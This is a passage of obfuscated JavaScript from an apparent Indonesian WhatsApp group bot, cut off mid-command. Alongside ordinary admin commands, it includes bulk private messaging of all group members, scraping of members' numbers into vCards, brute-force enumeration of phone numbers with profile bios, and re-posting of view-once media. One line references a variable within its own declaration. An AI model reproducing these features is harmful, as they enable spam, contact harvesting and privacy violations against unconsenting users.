            const _0x17d51a = await _0x59f5fa.groupMetadata(_0x2b2627.split('|')[0x0]);
            const _0x3e5ce2 = _0x17d51a.participants;
            for (let _0x48b056 of _0x3e5ce2) {
              await _0x59f5fa.sendMessage(_0x48b056.id.split('@')[0x0] + "@s.whatsapp.net", {
                'text': _0x2b2627.split('|')[0x1]
              });
              await sleep(0x1388);
            }
            _0x3a091f("✅ *Pesan berhasil dikirim ke semua anggota grup!* 📨");
          } catch {
            _0x3a091f("⚠️ *Penggunaan yang benar:*\n" + (_0x4773c6 + _0x4ac520) + " idgc|teks");
          }
        }
        break;
      case "pushcontact3":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚙️ *Penggunaan yang benar:*\n\n" + (_0x4773c6 + _0x4ac520) + " jeda|teks\n\n📸 *Reply gambar* untuk mengirim ke semua anggota.\n⏱️ *Jeda*: 1000 = 1 detik");
          }
          try {
            let _0x355065 = _0x2b2627.split('|')[0x0];
            let _0x415198 = _0x2b2627.split('|')[0x1];
            let _0x5b5043 = await _0x5b5043.filter(_0x495f78 => _0x495f78.id.endsWith('.net')).map(_0x2bf07f => _0x2bf07f.id);
            for (let _0x2453c0 of _0x5b5043) {
              if (/image/.test(_0x3df746)) {
                let _0xc34619 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
                let _0x3899e7 = await CatBox(_0xc34619);
                await _0x59f5fa.sendMessage(_0x2453c0, {
                  'image': {
                    'url': _0x3899e7
                  },
                  'caption': _0x415198
                }, {
                  'quoted': _0x3f87c6
                });
                await sleep(_0x355065);
              } else {
                await _0x59f5fa.sendMessage(_0x2453c0, {
                  'text': _0x415198
                }, {
                  'quoted': _0x3f87c6
                });
                await sleep(_0x355065);
              }
            }
            _0x3a091f("✅ *Pesan berhasil dikirim ke semua anggota!* 📨");
          } catch {
            _0x3a091f("⚙️ *Penggunaan yang benar:*\n\n" + (_0x4773c6 + _0x4ac520) + " jeda|teks\n\n📸 *Reply gambar* untuk mengirim ke semua anggota.\n⏱️ *Jeda*: 1000 = 1 detik");
          }
        }
        break;
      case "getcontact":
      case "getcon":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!(_0x3f87c6.isAdmin || _0x2cfe7f)) {
            return _0x3a091f(mess.owner);
          }
          bigpp = await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "\nGrup: *" + _0x1be075.subject + "*\nAnggota: *" + _0x1c92e6.length + '*'
          }, {
            'quoted': _0x3f87c6,
            'ephemeralExpiration': 0x15180
          });
          await sleep(0x3e8);
          _0x59f5fa.sendContact(_0x3f87c6.chat, _0x1c92e6.map(_0x477005 => _0x477005.id), bigpp);
        }
        break;
      case 'savecontact':
      case "svcontact":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!(_0x3f87c6.isAdmin || _0x2cfe7f)) {
            return _0x3a091f(mess.owner);
          }
          let _0x408f6b = await _0x59f5fa.groupMetadata(_0x3f87c6.chat);
          vcard = '';
          noPort = 0x0;
          for (let _0x265db6 of _0x408f6b.participants) {
            vcard += "BEGIN:VCARD\nVERSION:3.0\nFN:[" + noPort++ + "] +" + _0x265db6.id.split('@')[0x0] + "\nTEL;type=CELL;type=VOICE;waid=" + _0x265db6.id.split('@')[0x0] + ':+' + _0x265db6.id.split('@')[0x0] + "\nEND:VCARD\n";
          }
          _0x3a091f("\nTunggu sebentar, menyimpan... " + _0x408f6b.participants.length + " kontak");
          require('fs').writeFileSync("./contacts.vcf", vcard.trim());
          await sleep(0x7d0);
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'document': require('fs').readFileSync("./contacts.vcf"),
            'mimetype': "text/vcard",
            'fileName': "Contact.vcf",
            'caption': "\nSukses!\nGrup: *" + _0x408f6b.subject + "*\nKontak: *" + _0x408f6b.participants.length + '*'
          }, {
            'ephemeralExpiration': 0x15180,
            'quoted': _0x3f87c6
          });
          require('fs').unlinkSync("./contacts.vcf");
        }
        break;
      case "sendcontact":
      case "sencontact":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x3f87c6.mentionedJid[0x0]) {
            return _0x3a091f("\nGunakan seperti ini\n*Kirim perintah*: .sendcontact @tag name");
          }
          let _0xab3544 = _0x2b2627.split(" ")[0x1] ? _0x2b2627.split(" ")[0x1] : 'Contact';
          let _0x172221 = {
            'displayName': "Contact",
            'contacts': [{
              'displayName': _0xab3544,
              'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:;" + _0xab3544 + ";;;\nFN:" + _0xab3544 + "\nitem1.TEL;waid=" + _0x3f87c6.mentionedJid[0x0].split('@')[0x0] + ':' + _0x3f87c6.mentionedJid[0x0].split('@')[0x0] + "\nitem1.X-ABLabel:Mobile\nEND:VCARD"
            }]
          };
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'contacts': _0x172221
          }, {
            'ephemeralExpiration': 0x15180
          });
        }
        break;
      case "contacttag":
      case "contag":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!(_0x3f87c6.isAdmin || _0x2cfe7f)) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x3f87c6.mentionedJid[0x0]) {
            return _0x3a091f("\nGunakan seperti ini\n*Kirim perintah*: .contacttag @tag|name");
          }
          let _0x2f9aa8 = _0x2b2627.split(" ")[0x1] ? _0x2b2627.split(" ")[0x1] : "Contact";
          let _0x3b337d = {
            'displayName': "Contact",
            'contacts': [{
              'displayName': _0x2f9aa8,
              'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:;" + _0x2f9aa8 + ";;;\nFN:" + _0x2f9aa8 + "\nitem1.TEL;waid=" + _0x3f87c6.mentionedJid[0x0].split('@')[0x0] + ':' + _0x3f87c6.mentionedJid[0x0].split('@')[0x0] + "\nitem1.X-ABLabel:Mobile\nEND:VCARD"
            }]
          };
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'contacts': _0x3b337d,
            'mentions': _0x1c92e6.map(_0x42d422 => _0x42d422.id)
          }, {
            'ephemeralExpiration': 0x15180
          });
        }
        break;
      case "sendlocation":
      case "sendloc":
        {
          let _0x5b82ed = -6.17511;
          let _0xcfdc73 = _0x3f87c6.chat;
          await _0x59f5fa.sendMessage(_0xcfdc73, {
            'location': {
              'degreesLatitude': _0x5b82ed,
              'degreesLongitude': 106.865039
            }
          });
          _0x3a091f("Lokasi ini berada di Jakarta");
        }
        break;
      case "block":
      case "ban":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x572f1d = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.m.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x59f5fa.updateBlockStatus(_0x572f1d, "block");
          await _0x3a091f(mess.done);
        }
        break;
      case "unblock":
      case "unban":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x57f0ed = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.m.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x59f5fa.updateBlockStatus(_0x57f0ed, "unblock");
          await _0x3a091f(mess.done);
        }
        break;
      case "getcase":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Harap masukkan nama case yang ingin dicari! 🧐");
          }
          try {
            const _0x5d406f = _0xafe9 => {
              const _0xa9573d = fs.readFileSync("./case.js", "utf-8");
              const _0x4bb648 = _0xa9573d.split("case '" + _0xafe9 + "'")[0x1];
              if (!_0x4bb648) {
                throw new Error("Case not found");
              }
              return "case '" + _0xafe9 + "'" + _0x4bb648.split("break")[0x0] + 'break';
            };
            _0x3a091f('' + _0x5d406f(_0x2b2627));
          } catch (_0x2024a4) {
            _0x3a091f("Case '" + _0x2b2627 + "' tidak ditemukan! 🚫");
          }
        }
        break;
      case "nsfw":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (_0x143458[0x0] === 'on') {
            if (_0x31d696) {
              return _0x3a091f("Fitur NSFW sudah aktif sebelumnya!");
            }
            ntnsfw.push(_0x3f87c6.chat);
            fs.writeFileSync("./src/data/function/nsfw.json", JSON.stringify(ntnsfw));
            _0x3a091f("Fitur NSFW berhasil diaktifkan di grup ini!");
            let _0x4d866a = "*「 ⚠️ DANGER ⚠️ 」*\n\n";
            _0x4d866a += "Fitur NSFW telah diaktifkan di grup ini!\n";
            _0x4d866a += "Itu berarti kalian bisa mengakses konten sensitif melalui bot!\n";
            _0x3a091f(_0x4d866a);
          } else {
            if (_0x143458[0x0] === "off") {
              if (!_0x31d696) {
                return _0x3a091f("Fitur NSFW sudah nonaktif sebelumnya!");
              }
              let _0x4fffad = ntnsfw.indexOf(_0x3f87c6.chat);
              if (_0x4fffad !== -0x1) {
                ntnsfw.splice(_0x4fffad, 0x1);
              }
              fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw));
              _0x3a091f("Fitur NSFW berhasil dinonaktifkan di grup ini!");
            } else {
              let _0x506374 = "Silakan pilih opsi yang benar!\n\n";
              _0x506374 += "Contoh:\n" + (_0x4773c6 + _0x4ac520) + " on → untuk mengaktifkan\n";
              _0x506374 += _0x4773c6 + _0x4ac520 + " off → untuk menonaktifkan";
              _0x3a091f(_0x506374);
            }
          }
        }
        break;
      case "antiaudio":
      case "antiforeign":
      case "antisticker":
      case 'antiimage':
      case "antivideo":
      case "antiviewonce":
      case 'antibot':
      case 'antispam':
      case "antimedia":
      case "antidocument":
      case "anticontact":
      case 'antilocation':
      case "antilink":
      case 'antilinkgc':
      case "autoaigc":
      case "autoaipc":
      case 'autoaijapri':
      case "antibadword":
      case "antitoxic":
        {
          let _0x1f16c7 = {
            'antiaudio': "antiaudio",
            'antiforeign': "antiforeignnum",
            'antisticker': 'antisticker',
            'antiimage': "antiimage",
            'antivideo': "antivideo",
            'antiviewonce': 'antiviewonce',
            'antibot': "antibot",
            'antispam': "antispam",
            'antimedia': "antimedia",
            'antidocument': "antidocument",
            'anticontact': 'anticontact',
            'antilocation': "antilocation",
            'antilink': "antilink",
            'antilinkgc': "antilinkgc",
            'autoaigc': "autoaigc",
            'autoaipc': "autoaipc",
            'autoaijapri': 'autoaijapri',
            'antibadword': 'badword',
            'antitoxic': 'badword'
          };
          let _0x21bb71 = _0x1f16c7[_0x4ac520];
          if (!_0x21bb71) {
            return;
          }
          if (!_0x3f87c6.isGroup && _0x4ac520 !== "autoaipc") {
            return _0x3a091f("❗ Maaf, perintah ini hanya bisa digunakan di grup!");
          }
          if (_0x3f87c6.isGroup && !_0x26a295 && _0x4ac520 !== 'autoaipc') {
            return _0x3a091f("❗ Aku harus jadi admin dulu untuk menjalankan perintah ini!");
          }
          if (_0x3f87c6.isGroup && !_0x5312e8 && !_0x2cfe7f && _0x4ac520 !== "autoaipc") {
            return _0x3a091f("❗ Hanya admin yang bisa mengatur fitur ini!");
          }
          if (_0x4ac520 === 'autoaipc' && !_0x2cfe7f) {
            return _0x3a091f("❗ Hanya pemilik bot yang bisa mengaktifkan atau menonaktifkan fitur ini!");
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("⚠️ *Format salah!*\nGunakan perintah:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (_0x143458[0x0] === "true") {
            db.data.chats[_0x3f87c6.chat][_0x21bb71] = true;
            _0x3a091f("✅ *Fitur " + _0x4ac520 + " berhasil diaktifkan!* Sekarang fitur ini akan berjalan sesuai pengaturannya.");
          } else if (_0x143458[0x0] === "false") {
            db.data.chats[_0x3f87c6.chat][_0x21bb71] = false;
            _0x3a091f("❌ *Fitur " + _0x4ac520 + " telah dimatikan!* Jangan khawatir, Kak! Aku nggak akan mengaktifkan fitur ini sampai dihidupkan lagi.");
          } else {
            _0x3a091f("⚠️ *Oops! Formatnya salah!*\nGunakan perintah:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
        }
        break;
      case 'readvo':
      case "rvo":
      case 'readviewonce':
        {
          if (!_0x3f87c6.quoted) {
            return _0x3a091f("Reply ke gambar, video, atau audio yang ingin kamu lihat.");
          }
          if (_0x3f87c6.quoted.mtype !== 'viewOnceMessageV2') {
            return _0x3a091f("Pesan ini bukan pesan sekali lihat.");
          }
          try {
            let _0x47154b = await _0x3f87c6.quoted.download();
            let _0x47801f = await getContentType(_0x3f87c6.quoted.message);
            if (_0x47801f === "videoMessage") {
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'video': _0x47154b,
                'caption': _0x3f87c6.quoted.text,
                'mentions': _0x3f87c6.quoted.mentionedJid
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              if (_0x47801f === "imageMessage") {
                await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'image': _0x47154b,
                  'caption': _0x3f87c6.quoted.text,
                  'mentions': _0x3f87c6.quoted.mentionedJid
                }, {
                  'quoted': _0x3f87c6
                });
              } else if (_0x47801f === 'audioMessage') {
                await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'audio': _0x47154b,
                  'mimetype': "audio/mpeg",
                  'ptt': true
                }, {
                  'quoted': _0x3f87c6
                });
              }
            }
          } catch (_0x625d06) {
            console.log(_0x625d06);
          }
        }
        break;
      case "mute":
      case 'welcome':
      case "left":
      case "adminevent":
      case "groupevent":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (_0x4ac520 === "mute" && !_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          let _0x4e3c72 = {
            'mute': "mute",
            'welcome': 'welcome',
            'left': "left",
            'adminevent': "adminevent",
            'groupevent': "groupevent"
          };
          let _0x25f25e = _0x4e3c72[_0x4ac520];
          if (!_0x25f25e) {
            return;
          }
          if (_0x143458[0x0] === "true") {
            db.data.chats[_0x3f87c6.chat][_0x25f25e] = true;
            _0x3a091f("✅ *Fitur " + _0x4ac520 + " telah diaktifkan!*");
          } else if (_0x143458[0x0] === "false") {
            db.data.chats[_0x3f87c6.chat][_0x25f25e] = false;
            _0x3a091f("❌ *Fitur " + _0x4ac520 + " telah dinonaktifkan!*");
          } else {
            _0x3a091f("❗ *Gunakan perintah yang benar:*\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
        }
        break;
      case "sider":
      case "gcsider":
        {
          const _0x37ffa9 = new Date().toLocaleString('en-US', {
            'timeZone': 'Asia/Jakarta'
          });
          const _0x261c54 = new Date(_0x37ffa9).getTime();
          let _0x254073 = _0x1be075.participants.map(_0x48ddc5 => _0x48ddc5.id);
          if (!_0x2b2627) {} else {}
          let _0x3f651f;
          _0x3f651f = _0x254073.length;
          let _0x44bfcc = 0x0;
          let _0x31d18d = [];
          for (let _0x1779b6 = 0x0; _0x1779b6 < _0x3f651f; _0x1779b6++) {
            let _0x4449ae = _0x3f87c6.isGroup ? _0x1be075.participants.find(_0x2e8512 => _0x2e8512.id == _0x254073[_0x1779b6]) : {};
            if ((typeof db.data.users[_0x254073[_0x1779b6]] == "undefined" || _0x261c54 * 0x1 - db.data.users[_0x254073[_0x1779b6]].lastseen > 604800000) && !_0x4449ae.isAdmin && !_0x4449ae.isSuperAdmin) {
              if (typeof db.data.users[_0x254073[_0x1779b6]] !== "undefined") {
                if (db.data.users[_0x254073[_0x1779b6]].banned == true) {
                  _0x44bfcc++;
                  _0x31d18d.push(_0x254073[_0x1779b6]);
                }
              } else {
                _0x44bfcc++;
                _0x31d18d.push(_0x254073[_0x1779b6]);
              }
            }
          }
          if (_0x44bfcc == 0x0) {
            return _0x3a091f("*Digrup ini tidak terdapat sider.*");
          }
          _0x3a091f('*' + _0x44bfcc + '/' + _0x3f651f + "* anggota grup *" + _0xcea8c4 + "* adalah sider dengan alasan :\n1. Unavailable selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“" + pesan + "”_\n\n*LIST SIDER :*\n" + _0x31d18d.map(_0xd34309 => " · @" + _0xd34309.replace(/@.+/, '' + typeof db.data.users[_0xd34309] == "undefined" ? " Sider " : " Off " + msToDate(_0x261c54 * 0x1 - db.data.users[_0xd34309].lastseen))).join("\n"));
        }
        break;
        case "k":
      case "kik":
      case 'buang':
      case "kick":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Eits, perintah ini cuma bisa dipakai di grup lho, kak! 🤭");
          }
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f("Lu siapa kocak? admin bukan owner bukan cuih sok asik ikut ikut, lu sini gw kick babi");
          }
          if (!_0x26a295) {
            return _0x3a091f("Aku belum jadi admin nih, kak. Jadikan aku admin dulu ya biar bisa bantu! 😢");
          }
          if (!_0x3f87c6.quoted && !_0x3f87c6.mentionedJid[0x0] && isNaN(parseInt(_0x143458[0x0]))) {
            return _0x3a091f("Mau kick siapa bray? ciah elah langsung tag aja bocahnya kelamaan udah gass kik aja kik bocah begitu mah kek anjeng");
          }
          let _0x36dd8e = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (ownerNumber.includes(_0x36dd8e.replace("@s.whatsapp.net", ''))) {
            return _0x3a091f("Eh, itu kan owner aku, kak! Jangan usil dong, nanti aku dimarahin. 😣");
          }
          try {
            await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x36dd8e], 'remove');
            _0x3a091f("Yey, udah berhasil kak! Bye-bye orang yang tadi~ 👋✨");
          } catch (_0x1dd0bd) {
            console.error(_0x1dd0bd);
            _0x3a091f("Aduh, ada yang salah nih waktu aku coba kick orangnya. Coba cek lagi ya, kak. 😥");
          }
        }
        ;
        break;
      case "wanumber":
      case "nowa":
      case 'searchno':
      case 'searchnumber':
        {
          if (!_0x2b2627) {
            return _0x3a091f("Kak, tolong kasih nomor dengan format yang benar ya!\n\n*Kirim perintah*: *" + (_0x4773c6 + _0x4ac520) + " 6281234567x* 😄");
          }
          let _0x5dea97 = _0x2b2627.split(" ")[0x0];
          _0x3a091f("Tunggu sebentar ya kak, KoKoRey lagi cari nomornya... 🔍✨");
          let _0x3acb4b = _0x5dea97.split('x')[0x0];
          let _0x28fc83 = _0x5dea97.split('x')[_0x5dea97.split('x').length - 0x1] || '';
          let _0x2a922e = _0x5dea97.split('x').length - 0x1;
          let _0x3e713c = Math.pow(0xa, _0x2a922e);
          let _0x5b6e81 = "📱 *Hasil Pencarian Nomor WhatsApp*: 📱\n\n";
          let _0x305fa3 = "📌 *Nomor Tanpa Bio*: 📌\n";
          let _0x4bfe9c = "🚫 *Nomor yang Tidak Terdaftar WhatsApp*: 🚫\n";
          for (let _0x1d5849 = 0x0; _0x1d5849 < _0x3e713c; _0x1d5849++) {
            let _0x3114d6 = String(_0x1d5849).padStart(_0x2a922e, '0');
            let _0x328ead = '' + _0x3acb4b + _0x3114d6 + _0x28fc83;
            try {
              let _0x410b45 = await _0x59f5fa.onWhatsApp(_0x328ead + "@s.whatsapp.net");
              if (_0x410b45.length === 0x0) {
                _0x4bfe9c += "- " + _0x328ead + "\n";
                continue;
              }
              let _0x22b265;
              try {
                _0x22b265 = await _0x59f5fa.fetchStatus(_0x410b45[0x0].jid);
              } catch {
                _0x22b265 = {
                  'status': '',
                  'setAt': null
                };
              }
              if (!_0x22b265.status || _0x22b265.status.length === 0x0) {
                _0x305fa3 += "- wa.me/" + _0x410b45[0x0].jid.split('@')[0x0] + "\n";
              } else {
                _0x5b6e81 += "🪀 *Nomor*: wa.me/" + _0x410b45[0x0].jid.split('@')[0x0] + "\n";
                _0x5b6e81 += "🎗️ *Bio*: " + _0x22b265.status + "\n";
                _0x5b6e81 += "🗓️ *Terakhir diperbarui*: " + moment(_0x22b265.setAt).tz("Asia/Jakarta").format("HH:mm:ss DD/MM/YYYY") + "\n\n";
              }
            } catch (_0x49741c) {
              console.error(_0x49741c);
              _0x4bfe9c += "- " + _0x328ead + "\n";
            }
          }
          let _0x516ba5 = "✨ *Pencarian Selesai, Kak!* ✨\n\n";
          _0x516ba5 += _0x5b6e81;
          _0x516ba5 += "\n" + _0x305fa3;
          _0x516ba5 += "\n" + _0x4bfe9c;
          _0x516ba5 += "\nKalau butuh bantuan lagi, panggil KoKoRey ya! 🤗";
          _0x3a091f(_0x516ba5);
        }
        break;
      case 'add':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (!_0x2b2627 && !_0x3f87c6.quoted) {
            _0x3a091f("Cara pakai command: " + (_0x4773c6 + _0x4ac520) + " 62xxx");
          } else {
            const _0x56bd05 = _0x2b2627 ? _0x2b2627.replace(/\D/g, '') + '@s.whatsapp.net' : _0x3f87c6.quoted?.["sender"];
            try {
              await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x56bd05], "add").then(async _0x152d76 => {
                for (let _0x2da1cf of _0x152d76) {
                  let _0x4c2250 = await _0x59f5fa.groupInviteCode(_0x3f87c6.chat);
                  if (_0x2da1cf.status == 0x198) {
                    return _0x3a091f("Oh no, sepertinya user baru saja keluar dari grup ini! 😔");
                  }
                  if (_0x2da1cf.status == 0x191) {
                    return _0x3a091f("Aduh, usernya kayaknya ngeblok bot ini deh! 😢");
                  }
                  if (_0x2da1cf.status == 0x199) {
                    return _0x3a091f("Wah, user ini udah masuk grup! 🎉");
                  }
                  if (_0x2da1cf.status == 0x1f4) {
                    return _0x3a091f("Maaf, grup ini sudah penuh! 😞");
                  }
                  if (_0x2da1cf.status == 0x193) {
                    await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                      'text': '@' + _0x56bd05.split('@')[0x0] + " Gak bisa ditambahin nih\n\nKarena targetnya private banget! 😅\n\nTapi, undangannya bakal dikirim ke\n-> wa.me/" + _0x56bd05.replace(/\D/g, '') + "\nLewat chat pribadi ya!",
                      'mentions': [_0x56bd05]
                    }, {
                      'quoted': _0x3f87c6
                    });
                    await _0x59f5fa.sendMessage('' + (_0x56bd05 ? _0x56bd05 : creator), {
                      'text': 'https://chat.whatsapp.com/' + _0x4c2250 + "\n━━━━━━━━━━━━━━━━━━━━━\n\nAdmin: wa.me/" + _0x3f87c6.sender + "\nUndang Kamu ke grup ini\nAyo masuk kalau mau ya! 🙇",
                      'detectLink': true,
                      'mentions': [_0x56bd05]
                    }, {
                      'quoted': floc2
                    })["catch"](_0x53f81e => _0x3a091f("Gagal kirim undangan! 😔"));
                  } else {
                    _0x3a091f(mess.done);
                  }
                }
              });
            } catch (_0x4ea4b1) {
              _0x3a091f("Gagal nambahin usernya nih, ada yang salah! 😢");
            }
          }
        }
        break;
      case "promote":
      case 'pm':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (!_0x3f87c6.quoted && !_0x3f87c6.mentionedJid[0x0] && isNaN(parseInt(_0x143458[0x0]))) {
            return _0x3a091f("Hmm... Kamu mau promote siapa?");
          }
          let _0x5ac1ce = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (!_0x3f87c6.mentionedJid[0x0] && !_0x3f87c6.quoted && !_0x2b2627) {
            return _0x3a091f("Hmm... Kamu mau " + _0x4ac520 + " siapa? 🤔");
          }
          await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x5ac1ce], "promote").then(_0x310cff => _0x3a091f(mess.done))['catch'](_0x25a737 => _0x3a091f(mess.error));
        }
        break;
      case 'demote':
      case 'dm':
        case 'batal':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (!_0x3f87c6.quoted && !_0x3f87c6.mentionedJid[0x0] && isNaN(parseInt(_0x143458[0x0]))) {
            return _0x3a091f("Hmm... Kamu Kamu demote siapa? 🤔");
          }
          let _0x4420f7 = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (!_0x3f87c6.mentionedJid[0x0] && !_0x3f87c6.quoted && !_0x2b2627) {
            return _0x3a091f("Hmm... Kamu mau " + _0x4ac520 + " siapa? 🤔");
          }
          await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x4420f7], "demote").then(_0x1432fc => _0x3a091f(mess.done))["catch"](_0x296d8e => _0x3a091f(mess.error));
        }
        break;
      case "revoke":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          await _0x59f5fa.groupRevokeInvite(_0x3f87c6.chat).then(_0x466dfd => {
            _0x3a091f(mess.done);
          })["catch"](() => _0x3a091f(mess.error));
        }
        break;
      case "setnamegc":
      case 'setsubject':
        if (!_0x3f87c6.isGroup) {
          return _0x3a091f(mess.group);
        }
        if (!_0x5312e8 && !_0x1397a2 && !_0x2cfe7f) {
          return _0x3a091f(mess.admin);
        }
        if (!_0x26a295) {
          return _0x3a091f(mess.botAdmin);
        }
        if (!_0x2b2627) {
          return _0x3a091f("Mau di namain apa kak grupnya? 🤔");
        }
        await _0x59f5fa.groupUpdateSubject(_0x3f87c6.chat, _0x2b2627);
        _0x3a091f(mess.done);
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          if (!_0x5dba36) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (!/image/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (/webp/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          let _0x4fa0cf = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          await _0x59f5fa.updateProfilePicture(_0x3f87c6.chat, {
            'url': _0x4fa0cf
          })["catch"](_0x364a1b => fs.unlinkSync(_0x4fa0cf));
          _0x3a091f(mess.done);
        }
        break;
      case "deleteppgroup":
      case "delppgc":
      case "deleteppgc":
      case 'delppgroup':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (!_0x26a295) {
            return _0x3a091f(mess.botAdmin);
          }
          await _0x59f5fa.removeProfilePicture(_0x3f87c6.chat);
        }
        break;
      case "setppbot":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x5dba36) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (!/image/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (/webp/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          let _0x1393f0 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          await _0x59f5fa.updateProfilePicture(_0xb3f81d, {
            'url': _0x1393f0
          })["catch"](_0x5ee87c => fs.unlinkSync(_0x1393f0));
          _0x3a091f(mess.done);
        }
        break;
      case "pppanjang":
      case "setppbot2":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x5dba36) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (!/image/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (/webp/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          let _0xf3e81a = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          const {
            img: _0x5bff0e
          } = await generateProfilePicture(_0xf3e81a);
